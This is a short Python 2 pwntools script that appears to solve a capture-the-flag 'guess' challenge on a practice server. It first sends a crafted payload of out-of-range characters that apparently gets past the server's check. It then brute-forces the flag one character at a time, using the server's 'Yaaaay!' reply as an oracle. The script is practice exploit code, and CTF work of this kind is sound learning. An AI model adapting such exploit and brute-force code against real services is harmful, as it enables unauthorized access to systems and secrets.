#! /usr/bin/python

from pwn import *
from string import *

def main():

	### modify trans_flag###

	payload=""
	for i in range(50):
	    payload+="0"+chr(0x40+128+i)
	p=remote("pwn.jarvisoj.com",9878)
	p.recvuntil("guess>")
	p.sendline(payload)
	p.recvline()
	p.close()

	###burst flag###
	p=remote("pwn.jarvisoj.com",9878)
	p.recvuntil("guess>")
	flag=list(payload)
	YES='Yaaaay!'
	Flag=''
	for i in range(50):
	    for j in string.printable:
		flag[2*i]=j.encode('hex')[0]
		flag[2*i+1]=j.encode('hex')[1]
		p.sendline("".join(flag))
		print flag
		Re=p.recvline()
		print Re
		print Flag
		if (YES in Re)==1:
		    Flag+=j
		    break




if __name__ == '__main__':
	main()
